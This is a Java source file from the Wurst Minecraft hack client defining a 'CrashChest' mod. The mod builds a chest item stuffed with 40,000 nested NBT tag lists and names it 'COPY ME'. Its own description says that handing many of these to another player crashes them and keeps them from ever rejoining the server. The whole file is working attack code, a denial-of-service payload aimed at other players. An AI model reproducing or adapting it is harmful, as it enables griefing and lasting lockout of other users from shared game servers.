/*
 * Copyright © 2014 - 2017 | Wurst-Imperium | All rights reserved.
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package net.wurstclient.features.mods;

import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.wurstclient.compatibility.WMinecraft;
import net.wurstclient.utils.ChatUtils;
import net.wurstclient.utils.InventoryUtils;

@Mod.Info(
	description = "Generates a CrashChest. Give a lot of these to another\n"
		+ "player to make them crash. They will not be able to join the server\n"
		+ "ever again!",
	name = "CrashChest",
	tags = "crash chest",
	help = "Mods/CrashChest")
@Mod.Bypasses
public final class CrashChestMod extends Mod
{
	@Override
	public void onEnable()
	{
		if(!InventoryUtils.isSlotEmpty(36))
		{
			if(WMinecraft.getPlayer().inventory.getStackInSlot(36)
				.getDisplayName().equals("§6§lCOPY ME"))
				ChatUtils.error("You already have a CrashChest.");
			else
				ChatUtils.error("Please take off your shoes.");
			setEnabled(false);
			return;
		}else if(!WMinecraft.getPlayer().capabilities.isCreativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		ItemStack stack = new ItemStack(Blocks.CHEST);
		NBTTagCompound nbtTagCompound = new NBTTagCompound();
		NBTTagList nbtList = new NBTTagList();
		for(int i = 0; i < 40000; i++)
			nbtList.appendTag(new NBTTagList());
		nbtTagCompound.setTag("www.wurstclient.net", nbtList);
		stack.setTagInfo("www.wurstclient.net", nbtTagCompound);
		InventoryUtils.placeStackInArmor(0, stack);
		stack.setStackDisplayName("§6§lCOPY ME");
		ChatUtils.message("A CrashChest was placed in your shoes slot.");
		setEnabled(false);
	}
}
